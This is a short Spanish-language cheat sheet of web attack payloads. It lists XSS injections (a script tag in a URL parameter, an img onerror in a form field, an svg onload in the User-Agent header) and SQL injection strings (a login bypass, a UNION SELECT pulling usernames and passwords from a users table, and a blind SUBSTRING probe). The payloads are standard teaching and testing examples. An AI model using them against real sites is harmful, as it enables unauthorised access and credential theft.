# Ejemplos de uso de payloads XSS y SQLi

## XSS

- Inyectar en parámetro URL:  
  `http://vulnerable.com/page?search=<script>alert('XSS')</script>`

- En formulario HTML con input:  
  `<input type="text" name="username" value="<img src=x onerror=alert('XSS')>">`

- En header HTTP User-Agent:  
  `User-Agent: <svg/onload=alert('XSS')>`

---

## SQLi

- Autenticación bypass en login:  
  `' OR '1'='1`

- Union-based injection para obtener tablas:  
  `' UNION SELECT null, username, password FROM users --`

- Blind SQLi ejemplo:  
  `' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1) = 'a' --`
